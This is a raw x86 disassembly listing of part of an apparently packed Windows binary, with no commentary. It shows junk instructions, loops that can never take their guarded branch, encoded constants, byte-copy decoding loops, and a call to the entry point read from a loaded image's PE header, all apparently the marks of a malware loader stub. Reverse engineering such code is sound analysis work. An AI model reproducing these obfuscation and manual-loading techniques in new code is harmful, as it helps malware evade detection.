  41b8e1:	sbb    DWORD PTR ds:0x42b008,0x4024
  41b8eb:	push   0xc
  41b8ed:	mov    DWORD PTR ds:0x429000,0x5718
  41b8f7:	push   0x3
  41b8f9:	and    DWORD PTR ds:0x42b004,0x67ab
  41b903:	push   0x2
  41b905:	push   0x78769798
  41b90a:	or     DWORD PTR ds:0x428024,0x42c014
  41b914:	call   DWORD PTR ds:0x42400c
  41b91a:	or     DWORD PTR ds:0x42c000,0x429014
  41b924:	push   0x57658733
  41b929:	and    DWORD PTR ds:0x42c000,0x42900c
  41b933:	call   DWORD PTR ds:0x424008
  41b939:	push   0x97667654
  41b93e:	call   DWORD PTR ds:0x424000
  41b944:	movzx  eax,BYTE PTR ds:0x428004
  41b94b:	mov    eax,DWORD PTR [ebp-0x18]
  41b94e:	cmp    eax,0xf89c85b6
  41b953:	mov    DWORD PTR ds:0x42c018,0x6f46
  41b95d:	jne    0x41ba3b
  41b963:	sub    DWORD PTR ds:0x42b018,0x42901c
  41b96d:	xor    edi,edi
  41b96f:	inc    edi
  41b970:	xor    esi,esi
  41b972:	inc    esi
  41b973:	mov    DWORD PTR ds:0x429018,0x36e4
  41b97d:	mov    DWORD PTR ds:0x421d76,0xf89c85b5
  41b987:	mov    DWORD PTR ds:0x42c004,0x59b7
  41b991:	cmp    edi,0x20
  41b994:	mov    DWORD PTR ds:0x42c000,0x70dd
  41b99e:	jne    0x41ba00
  41b9a4:	mov    DWORD PTR ds:0x428000,0x41f9
  41b9ae:	cmp    esi,edi
  41b9b0:	mov    DWORD PTR ds:0x42901c,0x1be9
  41b9ba:	jne    0x41ba00
  41b9c0:	or     DWORD PTR ds:0x429010,0x42900c
  41b9ca:	push   DWORD PTR [ebp+0x10]
  41b9cd:	and    DWORD PTR ds:0x428004,0x1bdc
  41b9d7:	push   DWORD PTR [ebp+0xc]
  41b9da:	add    DWORD PTR ds:0x428008,0x6df8
  41b9e4:	push   DWORD PTR [ebp+0x8]
  41b9e7:	call   0x41b718
  41b9ec:	mov    ecx,DWORD PTR ds:0x428018
  41b9f2:	mov    ecx,DWORD PTR ds:0x421c66
  41b9f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b9fe:	mov    DWORD PTR [ecx],eax
  41ba00:	mov    DWORD PTR ds:0x42a018,0x7241
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x42b01c,0x57c2
  41ba15:	cmp    esi,0x21
  41ba18:	jne    0x41b973
  41ba1e:	mov    DWORD PTR ds:0x42a010,0x26a0
  41ba28:	inc    edi
  41ba29:	cmp    edi,esi
  41ba2b:	mov    DWORD PTR ds:0x429008,0x19e2
  41ba35:	jne    0x41b970
  41ba3b:	mov    edx,0xf89c85b6
  41ba40:	and    DWORD PTR ds:0x42b014,0x0
  41ba4a:	mov    esi,DWORD PTR ds:0x42b014
  41ba50:	inc    esi
  41ba51:	mov    DWORD PTR ds:0x42b014,esi
  41ba57:	cmp    DWORD PTR ds:0x42b014,0x6
  41ba5e:	jne    0x41ba8c
  41ba64:	push   0x429014
  41ba69:	push   0x534b
  41ba6e:	push   DWORD PTR [ebp-0x18]
  41ba71:	push   0x428028
  41ba76:	push   0x4cdf
  41ba7b:	push   0x423992
  41ba80:	push   DWORD PTR [ebp-0x28]
  41ba83:	push   DWORD PTR [ebp-0x10]
  41ba86:	call   DWORD PTR ds:0x424024
  41ba8c:	cmp    DWORD PTR ds:0x42b014,0x5
  41ba93:	jne    0x41baa6
  41ba99:	mov    esi,DWORD PTR ds:0x42b014
  41ba9f:	inc    esi
  41baa0:	mov    DWORD PTR ds:0x42b014,esi
  41baa6:	cmp    DWORD PTR ds:0x42b014,0x11
  41baad:	jb     0x41ba4a
  41bab3:	adc    esi,DWORD PTR ds:0x429000
  41bab9:	mov    DWORD PTR [ebp-0x4],edx
  41babc:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bac3:	add    ecx,0x1410
  41bac9:	lea    eax,[ebp-0x44]
  41bacc:	xor    edi,edi
  41bace:	xor    edi,DWORD PTR ds:0x42b008
  41bad4:	add    edi,DWORD PTR ds:0x42800c
  41bada:	mov    DWORD PTR ds:0x42b008,edi
  41bae0:	mov    DWORD PTR [ebp-0x3c],eax
  41bae3:	lea    eax,[ebp-0x48]
  41bae6:	or     edi,esi
  41bae8:	mov    DWORD PTR [ebp-0x24],eax
  41baeb:	mov    eax,ds:0x421c66
  41baf0:	adc    DWORD PTR ds:0x428014,ebx
  41baf6:	mov    eax,DWORD PTR [eax+0x1c8]
  41bafc:	and    DWORD PTR ds:0x42a01c,0x0
  41bb06:	jmp    0x41bb18
  41bb0b:	mov    edi,DWORD PTR ds:0x42a01c
  41bb11:	inc    edi
  41bb12:	mov    DWORD PTR ds:0x42a01c,edi
  41bb18:	cmp    DWORD PTR ds:0x42a01c,0x1f
  41bb1f:	jae    0x41bb48
  41bb25:	cmp    DWORD PTR ds:0x42a01c,0x2a
  41bb2c:	jne    0x41bb43
  41bb32:	push   DWORD PTR [ebp-0x24]
  41bb35:	push   DWORD PTR [ebp-0x1c]
  41bb38:	push   0x27cc
  41bb3d:	call   DWORD PTR ds:0x424028
  41bb43:	jmp    0x41bb0b
  41bb48:	mov    eax,DWORD PTR [eax]
  41bb4a:	xor    esi,esi
  41bb4c:	or     esi,DWORD PTR ds:0x429000
  41bb52:	adc    DWORD PTR ds:0x429014,esi
  41bb58:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb5b:	mov    esi,0x7510893
  41bb60:	mov    edi,DWORD PTR ds:0x429010
  41bb66:	or     edi,DWORD PTR ds:0x42a01c
  41bb6c:	mov    DWORD PTR ds:0x429010,edi
  41bb72:	xor    eax,esi
  41bb74:	movzx  edi,BYTE PTR ds:0x42a014
  41bb7b:	adc    edi,DWORD PTR ds:0x42a004
  41bb81:	mov    DWORD PTR ds:0x42a014,edi
  41bb87:	mov    edi,0x3272db
  41bb8c:	add    DWORD PTR ds:0x428000,0x429004
  41bb96:	add    eax,edi
  41bb98:	mov    DWORD PTR ds:0x428000,0xa07
  41bba2:	mov    DWORD PTR [ecx],eax
  41bba4:	mov    eax,0x1dcc
  41bba9:	mov    eax,ds:0x421e82
  41bbae:	cmp    eax,0x301ac8f5
  41bbb3:	mov    DWORD PTR ds:0x42a01c,0x9b1
  41bbbd:	jne    0x41bc4c
  41bbc3:	or     ecx,DWORD PTR ds:0x42b014
  41bbc9:	mov    eax,DWORD PTR [ebp-0x4]
  41bbcc:	dec    DWORD PTR ds:0x429000
  41bbd2:	mov    ecx,DWORD PTR ds:0x421c66
  41bbd8:	adc    DWORD PTR ds:0x42a004,ebx
  41bbde:	mov    ecx,DWORD PTR [ecx+0x198]
  41bbe4:	add    ebx,DWORD PTR ds:0x428014
  41bbea:	xor    eax,esi
  41bbec:	sbb    ebx,DWORD PTR ds:0x429010
  41bbf2:	add    eax,edi
  41bbf4:	mov    DWORD PTR [ecx],eax
  41bbf6:	and    DWORD PTR ds:0x428000,0x0
  41bc00:	xor    eax,eax
  41bc02:	add    eax,DWORD PTR ds:0x428000
  41bc08:	inc    eax
  41bc09:	mov    ds:0x428000,eax
  41bc0e:	cmp    DWORD PTR ds:0x428000,0x23
  41bc15:	jne    0x41bc2b
  41bc1b:	push   0x42385f
  41bc20:	push   0x423893
  41bc25:	call   DWORD PTR ds:0x424030
  41bc2b:	cmp    DWORD PTR ds:0x428000,0x17
  41bc32:	jb     0x41bc00
  41bc38:	mov    eax,DWORD PTR [ebp-0x4]
  41bc3b:	and    DWORD PTR ds:0x42a018,edx
  41bc41:	xor    eax,esi
  41bc43:	xor    ebx,ebx
  41bc45:	add    eax,edi
  41bc47:	mov    ds:0x421e82,eax
  41bc4c:	sub    eax,eax
  41bc4e:	mov    eax,ds:0x421c66
  41bc53:	adc    DWORD PTR ds:0x42b018,0x29cb
  41bc5d:	mov    eax,DWORD PTR [eax+0x18c]
  41bc63:	and    DWORD PTR ds:0x42a004,0x0
  41bc6d:	mov    ebx,DWORD PTR ds:0x42a004
  41bc73:	inc    ebx
  41bc74:	mov    DWORD PTR ds:0x42a004,ebx
  41bc7a:	cmp    DWORD PTR ds:0x42a004,0x13
  41bc81:	jne    0x41bca9
  41bc87:	push   0x49d6
  41bc8c:	push   0x649f
  41bc91:	push   DWORD PTR [ebp-0x20]
  41bc94:	push   0x2fe7
  41bc99:	push   0x2c94
  41bc9e:	push   0x42c018
  41bca3:	call   DWORD PTR ds:0x424038
  41bca9:	cmp    DWORD PTR ds:0x42a004,0x11
  41bcb0:	jb     0x41bc6d
  41bcb6:	xor    ecx,ecx
  41bcb8:	xor    ecx,DWORD PTR ds:0x42b004
  41bcbe:	sbb    ecx,DWORD PTR ds:0x42a008
  41bcc4:	mov    DWORD PTR ds:0x42b004,ecx
  41bcca:	mov    eax,DWORD PTR [eax]
  41bccc:	and    DWORD PTR ds:0x429004,0x0
  41bcd6:	xor    ecx,ecx
  41bcd8:	xor    ecx,DWORD PTR ds:0x429004
  41bcde:	inc    ecx
  41bcdf:	mov    DWORD PTR ds:0x429004,ecx
  41bce5:	cmp    DWORD PTR ds:0x429004,0xe
  41bcec:	jne    0x41bd02
  41bcf2:	push   0x42c014
  41bcf7:	push   0x2d10
  41bcfc:	call   DWORD PTR ds:0x42403c
  41bd02:	cmp    DWORD PTR ds:0x429004,0xd
  41bd09:	jne    0x41bd1c
  41bd0f:	mov    ecx,DWORD PTR ds:0x429004
  41bd15:	inc    ecx
  41bd16:	mov    DWORD PTR ds:0x429004,ecx
  41bd1c:	cmp    DWORD PTR ds:0x429004,0x1a
  41bd23:	jb     0x41bcd6
  41bd29:	or     ecx,ecx
  41bd2b:	mov    DWORD PTR [ebp-0x4c],eax
  41bd2e:	mov    ecx,0xf89c85ba
  41bd33:	sub    ebx,DWORD PTR ds:0x42c000
  41bd39:	mov    DWORD PTR [ebp-0x38],ecx
  41bd3c:	and    DWORD PTR ds:0x428024,edx
  41bd42:	mov    DWORD PTR [ebp-0x38],ecx
  41bd45:	and    DWORD PTR ds:0x42c014,0x0
  41bd4f:	mov    ebx,DWORD PTR ds:0x42c014
  41bd55:	inc    ebx
  41bd56:	mov    DWORD PTR ds:0x42c014,ebx
  41bd5c:	cmp    DWORD PTR ds:0x42c014,0x10
  41bd63:	jne    0x41bd77
  41bd69:	push   DWORD PTR [ebp-0x10]
  41bd6c:	push   0x4238de
  41bd71:	call   DWORD PTR ds:0x424040
  41bd77:	cmp    DWORD PTR ds:0x42c014,0xf
  41bd7e:	jne    0x41bd91
  41bd84:	mov    ebx,DWORD PTR ds:0x42c014
  41bd8a:	inc    ebx
  41bd8b:	mov    DWORD PTR ds:0x42c014,ebx
  41bd91:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bd98:	jb     0x41bd4f
  41bd9e:	sub    eax,eax
  41bda0:	mov    DWORD PTR [ebp-0x38],ecx
  41bda3:	or     DWORD PTR ds:0x429014,0x293b
  41bdad:	mov    DWORD PTR [ebp-0x30],edx
  41bdb0:	sub    edx,0x44be
  41bdb6:	mov    DWORD PTR [ebp-0x38],ecx
  41bdb9:	add    eax,DWORD PTR ds:0x428000
  41bdbf:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bdc6:	mov    eax,DWORD PTR [ebp-0x4]
  41bdc9:	movzx  edx,WORD PTR ds:0x428020
  41bdd0:	add    DWORD PTR ds:0x42b00c,edx
  41bdd6:	mov    edx,DWORD PTR [ebp-0x8]
  41bdd9:	adc    ebx,0x414f
  41bddf:	mov    ebx,DWORD PTR [ebp-0x8]
  41bde2:	xor    ebx,esi
  41bde4:	and    DWORD PTR ds:0x42c018,0x42a004
  41bdee:	xor    edx,esi
  41bdf0:	add    edx,ebx
  41bdf2:	movzx  ebx,BYTE PTR ds:0x42a01c
  41bdf9:	and    DWORD PTR ds:0x429018,ebx
  41bdff:	mov    ebx,DWORD PTR [ebp-0x8]
  41be02:	xor    ebx,esi
  41be04:	xor    DWORD PTR ds:0x428028,0x1d40
  41be0e:	xor    eax,esi
  41be10:	sbb    DWORD PTR ds:0x42a008,0x42a018
  41be1a:	add    eax,edi
  41be1c:	lea    edx,[edx+ebx*1+0x975891]
  41be23:	mov    ebx,0x7216
  41be28:	mov    DWORD PTR [ebp-0x14],eax
  41be2b:	mov    ebx,0x8a29a123
  41be30:	mov    DWORD PTR ds:0x429018,0x7968
  41be3a:	cmp    eax,edx
  41be3c:	ja     0x41c14b
  41be42:	mov    DWORD PTR ds:0x42a008,0x16
  41be4c:	cmp    DWORD PTR ds:0x42a008,0x0
  41be53:	je     0x41bea1
  41be59:	cmp    DWORD PTR ds:0x42a008,0xa
  41be60:	jne    0x41be71
  41be66:	push   0x423893
  41be6b:	call   DWORD PTR ds:0x424044
  41be71:	cmp    DWORD PTR ds:0x42a008,0xb
  41be78:	jne    0x41be8d
  41be7e:	xor    ecx,ecx
  41be80:	xor    ecx,DWORD PTR ds:0x42a008
  41be86:	dec    ecx
  41be87:	mov    DWORD PTR ds:0x42a008,ecx
  41be8d:	xor    ecx,ecx
  41be8f:	add    ecx,DWORD PTR ds:0x42a008
  41be95:	dec    ecx
  41be96:	mov    DWORD PTR ds:0x42a008,ecx
  41be9c:	jmp    0x41be4c
  41bea1:	mov    ecx,DWORD PTR [ebp-0x8]
  41bea4:	xor    ecx,esi
  41bea6:	lea    ecx,[ecx+eax*1+0x3272db]
  41bead:	or     DWORD PTR ds:0x429014,0x429018
  41beb7:	mov    DWORD PTR [ebp-0x10],ecx
  41beba:	mov    ecx,DWORD PTR [ebp-0x30]
  41bebd:	xor    ecx,esi
  41bebf:	adc    edx,0x7be1
  41bec5:	lea    ecx,[ebp+ecx*1+0x3272e3]
  41becc:	add    DWORD PTR ds:0x42b00c,0x3739
  41bed6:	mov    DWORD PTR [ebp-0x38],ecx
  41bed9:	and    DWORD PTR ds:0x429010,0x0
  41bee3:	mov    edx,DWORD PTR ds:0x429010
  41bee9:	inc    edx
  41beea:	mov    DWORD PTR ds:0x429010,edx
  41bef0:	cmp    DWORD PTR ds:0x429010,0x21
  41bef7:	jne    0x41bf12
  41befd:	push   0x1770
  41bf02:	push   0x42c01c
  41bf07:	push   0x423956
  41bf0c:	call   DWORD PTR ds:0x424048
  41bf12:	cmp    DWORD PTR ds:0x429010,0x1b
  41bf19:	jb     0x41bee3
  41bf1f:	mov    ecx,DWORD PTR ds:0x421c66
  41bf25:	mov    ecx,DWORD PTR [ecx+0x1bc]
  41bf2b:	and    DWORD PTR ds:0x42900c,0x0
  41bf35:	jmp    0x41bf47
  41bf3a:	mov    edx,DWORD PTR ds:0x42900c
  41bf40:	inc    edx
  41bf41:	mov    DWORD PTR ds:0x42900c,edx
  41bf47:	cmp    DWORD PTR ds:0x42900c,0x19
  41bf4e:	jae    0x41bf96
  41bf54:	cmp    DWORD PTR ds:0x42900c,0xa
  41bf5b:	jne    0x41bf6f
  41bf61:	push   0x42900c
  41bf66:	push   DWORD PTR [ebp-0x28]
  41bf69:	call   DWORD PTR ds:0x424014
  41bf6f:	cmp    DWORD PTR ds:0x42900c,0x9
  41bf76:	jne    0x41bf8b
  41bf7c:	xor    edx,edx
  41bf7e:	or     edx,DWORD PTR ds:0x42900c
  41bf84:	inc    edx
  41bf85:	mov    DWORD PTR ds:0x42900c,edx
  41bf8b:	jmp    0x41bf3a
  41bf90:	adc    edx,DWORD PTR ds:0x42b00c
  41bf96:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41bf9d:	and    DWORD PTR ds:0x42b00c,0x0
  41bfa7:	jmp    0x41bfbb
  41bfac:	xor    edx,edx
  41bfae:	xor    edx,DWORD PTR ds:0x42b00c
  41bfb4:	inc    edx
  41bfb5:	mov    DWORD PTR ds:0x42b00c,edx
  41bfbb:	cmp    DWORD PTR ds:0x42b00c,0x10
  41bfc2:	jae    0x41c020
  41bfc8:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bfcf:	jne    0x41bfff
  41bfd5:	push   0x33b5
  41bfda:	push   0x42b014
  41bfdf:	push   0x1dc5
  41bfe4:	push   0x42801c
  41bfe9:	push   DWORD PTR [ebp-0x14]
  41bfec:	push   0x39d8
  41bff1:	push   DWORD PTR [ebp-0x14]
  41bff4:	push   0x8914
  41bff9:	call   DWORD PTR ds:0x424018
  41bfff:	cmp    DWORD PTR ds:0x42b00c,0x4
  41c006:	jne    0x41c01b
  41c00c:	xor    edx,edx
  41c00e:	xor    edx,DWORD PTR ds:0x42b00c
  41c014:	inc    edx
  41c015:	mov    DWORD PTR ds:0x42b00c,edx
  41c01b:	jmp    0x41bfac
  41c020:	mov    DWORD PTR [ebp-0x34],ecx
  41c023:	and    DWORD PTR ds:0x42b01c,0x11ac
  41c02d:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  41c034:	sub    ecx,ecx
  41c036:	mov    ecx,DWORD PTR [ebp-0xc]
  41c039:	or     edx,DWORD PTR ds:0x428018
  41c03f:	mov    edx,DWORD PTR [ebp-0x10]
  41c042:	xor    ecx,esi
  41c044:	add    ecx,edi
  41c046:	cmp    ecx,edx
  41c048:	je     0x41c117
  41c04e:	mov    eax,DWORD PTR [ebp-0xc]
  41c051:	mov    ecx,DWORD PTR [ebp-0x10]
  41c054:	xor    edx,edx
  41c056:	xor    eax,esi
  41c058:	add    eax,edi
  41c05a:	add    ecx,0xfabdbef1
  41c060:	adc    edx,0xffffffff
  41c063:	xor    ecx,ebx
  41c065:	xor    edx,0x0
  41c068:	mov    DWORD PTR [ebp-0x68],ecx
  41c06b:	mov    DWORD PTR [ebp-0x64],edx
  41c06e:	xor    edx,edx
  41c070:	mov    ecx,eax
  41c072:	add    ecx,0xfabdbef1
  41c078:	adc    edx,0xffffffff
  41c07b:	xor    ecx,ebx
  41c07d:	xor    edx,0x0
  41c080:	mov    DWORD PTR [ebp-0x24],eax
  41c083:	mov    DWORD PTR [ebp-0x74],edx
  41c086:	cmp    ecx,DWORD PTR [ebp-0x68]
  41c089:	jne    0x41c09a
  41c08f:	mov    ecx,DWORD PTR [ebp-0x64]
  41c092:	cmp    edx,ecx
  41c094:	je     0x41c114
  41c09a:	mov    ecx,DWORD PTR [ebp-0xc]
  41c09d:	mov    edx,DWORD PTR [ebp-0x20]
  41c0a0:	xor    edx,esi
  41c0a2:	add    edx,edi
  41c0a4:	imul   edx,eax
  41c0a7:	xor    ecx,esi
  41c0a9:	add    ecx,eax
  41c0ab:	mov    eax,DWORD PTR [ebp-0x34]
  41c0ae:	mov    ebx,DWORD PTR [ebp-0x38]
  41c0b1:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c0b8:	mov    BYTE PTR [edx+eax*1],cl
  41c0bb:	mov    eax,DWORD PTR [ebp-0x20]
  41c0be:	mov    ecx,DWORD PTR [ebp-0x24]
  41c0c1:	xor    eax,esi
  41c0c3:	lea    eax,[ecx+eax*1+0x3272db]
  41c0ca:	mov    ecx,DWORD PTR [ebp-0x10]
  41c0cd:	xor    edx,edx
  41c0cf:	add    ecx,0xfabdbef1
  41c0d5:	adc    edx,0xffffffff
  41c0d8:	xor    edx,0x0
  41c0db:	mov    ebx,0x8a29a123
  41c0e0:	xor    ecx,ebx
  41c0e2:	mov    DWORD PTR [ebp-0x70],ecx
  41c0e5:	mov    DWORD PTR [ebp-0x6c],edx
  41c0e8:	xor    edx,edx
  41c0ea:	mov    ecx,eax
  41c0ec:	add    ecx,0xfabdbef1
  41c0f2:	adc    edx,0xffffffff
  41c0f5:	xor    ecx,ebx
  41c0f7:	xor    edx,0x0
  41c0fa:	mov    DWORD PTR [ebp-0x24],eax
  41c0fd:	mov    DWORD PTR [ebp-0x7c],edx
  41c100:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c103:	jne    0x41c09a
  41c109:	mov    ecx,DWORD PTR [ebp-0x6c]
  41c10c:	cmp    edx,ecx
  41c10e:	jne    0x41c09a
  41c114:	mov    eax,DWORD PTR [ebp-0x14]
  41c117:	mov    ecx,DWORD PTR [ebp-0x8]
  41c11a:	xor    ecx,esi
  41c11c:	lea    eax,[eax+ecx*1+0x3272db]
  41c123:	mov    ecx,DWORD PTR [ebp-0x8]
  41c126:	mov    edx,DWORD PTR [ebp-0x8]
  41c129:	xor    edx,esi
  41c12b:	xor    ecx,esi
  41c12d:	add    ecx,edx
  41c12f:	mov    edx,DWORD PTR [ebp-0x8]
  41c132:	xor    edx,esi
  41c134:	lea    ecx,[ecx+edx*1+0x975891]
  41c13b:	mov    DWORD PTR [ebp-0x14],eax
  41c13e:	cmp    eax,ecx
  41c140:	jbe    0x41be42
  41c146:	mov    ecx,0xf89c85ba
  41c14b:	mov    eax,DWORD PTR [ebp+0xc]
  41c14e:	mov    ds:0x421aea,eax
  41c153:	mov    eax,DWORD PTR [ebp+0x10]
  41c156:	mov    ds:0x421d3e,eax
  41c15b:	mov    eax,ds:0x421aea
  41c160:	mov    edx,DWORD PTR [ebp-0x3c]
  41c163:	sub    eax,edi
  41c165:	xor    eax,esi
  41c167:	mov    DWORD PTR [edx],eax
  41c169:	mov    eax,DWORD PTR [ebp-0x18]
  41c16c:	cmp    eax,0xf89c85b6
  41c171:	jne    0x41c19c
  41c177:	lea    eax,[ebp-0x28]
  41c17a:	mov    DWORD PTR [ebp-0x40],eax
  41c17d:	lea    eax,[ebp+0x4]
  41c180:	mov    DWORD PTR [ebp-0x28],eax
  41c183:	mov    eax,DWORD PTR [ebp-0x28]
  41c186:	test   eax,eax
  41c188:	je     0x41c2b4
  41c18e:	mov    eax,DWORD PTR [ebp-0x1c]
  41c191:	mov    eax,DWORD PTR [ebp-0x8]
  41c194:	lea    eax,[ebp-0x40]
  41c197:	jmp    0x41c2ab
  41c19c:	mov    eax,DWORD PTR [ebp-0x44]
  41c19f:	cmp    eax,0xf89c85b5
  41c1a4:	je     0x41c201
  41c1aa:	mov    eax,DWORD PTR [ebp-0x4]
  41c1ad:	mov    edx,DWORD PTR [ebp-0x48]
  41c1b0:	xor    eax,esi
  41c1b2:	add    eax,edi
  41c1b4:	cmp    eax,edx
  41c1b6:	je     0x41c201
  41c1bc:	mov    eax,ds:0x421c66
  41c1c1:	mov    eax,DWORD PTR [eax+0x194]
  41c1c7:	mov    ecx,DWORD PTR [eax]
  41c1c9:	mov    eax,DWORD PTR [ecx+0x3c]
  41c1cc:	push   DWORD PTR ds:0x421d3e
  41c1d2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41c1d6:	push   DWORD PTR ds:0x421aea
  41c1dc:	add    eax,ecx
  41c1de:	mov    ecx,DWORD PTR ds:0x421c66
  41c1e4:	mov    ecx,DWORD PTR [ecx+0x194]
  41c1ea:	push   DWORD PTR [ecx]
  41c1ec:	call   eax
  41c1ee:	mov    ecx,DWORD PTR ds:0x421c66
  41c1f4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41c1fa:	mov    DWORD PTR [ecx],eax
  41c1fc:	jmp    0x41c2b4
  41c201:	mov    eax,DWORD PTR [ebp-0x4]
  41c204:	mov    edx,DWORD PTR [ebp-0x4c]
  41c207:	xor    eax,esi
  41c209:	add    eax,edi
  41c20b:	cmp    eax,edx
  41c20d:	jne    0x41c26a
  41c213:	mov    eax,DWORD PTR [ebp-0x4]
  41c216:	mov    edx,DWORD PTR ds:0x421c66
  41c21c:	mov    edx,DWORD PTR [edx+0x198]
  41c222:	xor    eax,esi
  41c224:	add    eax,edi
  41c226:	cmp    eax,DWORD PTR [edx]
  41c228:	jne    0x41c247
  41c22e:	mov    eax,DWORD PTR [ebp-0x4]
  41c231:	push   0xf89c85b6
  41c236:	xor    eax,esi
  41c238:	add    eax,edi
  41c23a:	push   eax
  41c23b:	push   ecx
  41c23c:	push   DWORD PTR [ebp-0x8]
  41c23f:	push   DWORD PTR [ebp-0x4]
  41c242:	call   0x413d37
  41c247:	push   DWORD PTR [ebp-0x8]
  41c24a:	push   DWORD PTR [ebp-0x4]
  41c24d:	call   0x41af10
  41c252:	mov    eax,DWORD PTR [ebp-0x4]
  41c255:	xor    eax,esi
  41c257:	add    eax,edi
  41c259:	mov    ds:0x421cea,eax
  41c25e:	mov    eax,DWORD PTR [ebp-0x4]
  41c261:	xor    eax,esi
  41c263:	add    eax,edi
  41c265:	mov    ds:0x421ce2,eax
  41c26a:	lea    eax,[ebp-0x2c]
  41c26d:	mov    DWORD PTR [ebp-0x50],eax
  41c270:	lea    eax,[ebp+0x4]
  41c273:	mov    DWORD PTR [ebp-0x2c],eax
  41c276:	mov    eax,DWORD PTR [ebp-0x2c]
  41c279:	test   eax,eax
  41c27b:	je     0x41c2b4
  41c281:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  41c288:	mov    DWORD PTR [ebp-0x58],0x712ed08
  41c28f:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  41c296:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  41c29d:	call   0x401000
  41c2a2:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2a5:	mov    eax,DWORD PTR [ebp-0x8]
  41c2a8:	lea    eax,[ebp-0x50]
  41c2ab:	push   eax
  41c2ac:	push   DWORD PTR [ebp-0x4]
  41c2af:	call   0x40cf5e
  41c2b4:	mov    eax,ds:0x421c66
  41c2b9:	add    eax,0x1cc
  41c2be:	mov    DWORD PTR [ebp-0x38],eax
  41c2c1:	lea    eax,[ebp-0x1c]
  41c2c4:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  41c2cb:	mov    DWORD PTR [ebp-0x3c],eax
  41c2ce:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  41c2d5:	mov    eax,DWORD PTR [ebp+0xc]
  41c2d8:	xor    eax,esi
  41c2da:	mov    DWORD PTR [ebp+0x10],0x4
  41c2e1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2e4:	add    eax,edi
  41c2e6:	cmp    eax,ecx
  41c2e8:	je     0x41c3a9
  41c2ee:	mov    eax,DWORD PTR [ebp+0xc]
  41c2f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2f4:	xor    edx,edx
  41c2f6:	xor    eax,esi
  41c2f8:	add    eax,edi
  41c2fa:	add    ecx,0xfabdbef1
  41c300:	adc    edx,0xffffffff
  41c303:	xor    ecx,ebx
  41c305:	xor    edx,0x0
  41c308:	mov    DWORD PTR [ebp-0x70],ecx
  41c30b:	mov    DWORD PTR [ebp-0x6c],edx
  41c30e:	xor    edx,edx
  41c310:	mov    ecx,eax
  41c312:	add    ecx,0xfabdbef1
  41c318:	adc    edx,0xffffffff
  41c31b:	xor    ecx,ebx
  41c31d:	xor    edx,0x0
  41c320:	mov    DWORD PTR [ebp-0x20],eax
  41c323:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c326:	jne    0x41c335
  41c32c:	cmp    edx,DWORD PTR [ebp-0x6c]
  41c32f:	je     0x41c3a9
  41c335:	mov    ecx,DWORD PTR [ebp+0xc]
  41c338:	mov    edx,DWORD PTR [ebp-0x24]
  41c33b:	xor    edx,esi
  41c33d:	xor    ecx,esi
  41c33f:	add    ecx,eax
  41c341:	add    edx,edi
  41c343:	imul   edx,eax
  41c346:	mov    eax,DWORD PTR [ebp-0x3c]
  41c349:	mov    ebx,DWORD PTR [ebp-0x38]
  41c34c:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c353:	mov    BYTE PTR [edx+eax*1],cl
  41c356:	mov    eax,DWORD PTR [ebp-0x24]
  41c359:	mov    ecx,DWORD PTR [ebp-0x20]
  41c35c:	mov    edx,DWORD PTR [ebp+0x10]
  41c35f:	xor    eax,esi
  41c361:	lea    eax,[ecx+eax*1+0x3272db]
  41c368:	xor    ecx,ecx
  41c36a:	add    edx,0xfabdbef1
  41c370:	adc    ecx,0xffffffff
  41c373:	xor    ecx,0x0
  41c376:	mov    DWORD PTR [ebp-0x7c],ecx
  41c379:	xor    ebx,ebx
  41c37b:	xor    edx,0x8a29a123
  41c381:	mov    ecx,eax
  41c383:	add    ecx,0xfabdbef1
  41c389:	adc    ebx,0xffffffff
  41c38c:	xor    ecx,0x8a29a123
  41c392:	xor    ebx,0x0
  41c395:	mov    DWORD PTR [ebp-0x20],eax
  41c398:	cmp    ecx,edx
  41c39a:	jne    0x41c335
  41c3a0:	cmp    ebx,DWORD PTR [ebp-0x7c]
  41c3a3:	jne    0x41c335
  41c3a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41c3ac:	mov    eax,DWORD PTR [eax]
  41c3ae:	pop    edi
  41c3af:	pop    esi
  41c3b0:	pop    ebx
  41c3b1:	leave  
  41c3b2:	ret    0xc
  41c3b5:	push   ebp
  41c3b6:	mov    ebp,esp
  41c3b8:	sub    esp,0xa4
  41c3be:	mov    ecx,DWORD PTR [ebp+0x8]
  41c3c1:	and    DWORD PTR ds:0x42a01c,0x0
  41c3cb:	jmp    0x41c3db
  41c3d0:	mov    eax,ds:0x42a01c
  41c3d5:	inc    eax
  41c3d6:	mov    ds:0x42a01c,eax
  41c3db:	cmp    DWORD PTR ds:0x42a01c,0x17
  41c3e2:	jae    0x41c404
  41c3e8:	cmp    DWORD PTR ds:0x42a01c,0x25
  41c3ef:	jne    0x41c3fe
  41c3f5:	push   DWORD PTR [ebp-0x14]
  41c3f8:	call   DWORD PTR ds:0x42401c
  41c3fe:	jmp    0x41c3d0
  41c403:	inc    eax
  41c404:	mov    eax,0x8a85
  41c409:	sub    DWORD PTR ds:0x42a008,0x36bb
  41c413:	xor    ax,WORD PTR [ecx+0x20]
  41c417:	mov    DWORD PTR ds:0x42c018,0x1e
  41c421:	cmp    DWORD PTR ds:0x42c018,0x0
  41c428:	je     0x41c465
  41c42e:	cmp    DWORD PTR ds:0x42c018,0x25
  41c435:	jne    0x41c449
  41c43b:	push   DWORD PTR [ebp-0x10]
